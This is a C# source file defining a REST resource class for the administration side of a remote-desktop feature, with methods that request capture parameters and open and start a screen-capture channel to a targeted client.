using System.Net.Http.Headers;
using System.Threading;
using System.Threading.Tasks;
using Orcus.Administration.Library.Clients;
using Orcus.Administration.Library.Clients.Helpers;
using RemoteDesktop.Administration.Channels;
using RemoteDesktop.Shared;
using RemoteDesktop.Shared.Dtos;

namespace RemoteDesktop.Administration.Rest
{
    public class RemoteDesktopResource : ChannelResource<RemoteDesktopResource>
    {
        public RemoteDesktopResource() : base("RemoteDesktop")
        {
        }

        public static Task<ParametersDto> GetParameters(ITargetedRestClient restClient) => CreateRequest(HttpVerb.Get, "parameters").Execute(restClient).Return<ParametersDto>();

        public static Task<RemoteDesktopChannel> CreateScreenChannel(ComponentOptions captureOptions, ComponentOptions encoderOptions,
            ITargetedRestClient restClient)
        {
            var requestBuilder = CreateRequest(HttpVerb.Get, "screen");
            requestBuilder.Message.Headers.Add("capture", captureOptions.ToString());
            requestBuilder.Message.Headers.AcceptEncoding.Add(new StringWithQualityHeaderValue(encoderOptions.ToString(), 1));

            return requestBuilder.CreateChannel<RemoteDesktopChannel>(restClient, CancellationToken.None);
        }
            

        public static Task StartScreenChannel(RemoteDesktopChannel channel, ITargetedRestClient restClient) =>
            CreateRequest(HttpVerb.Get, "screen/start", null).ExecuteOnChannel(restClient, channel);
    }
}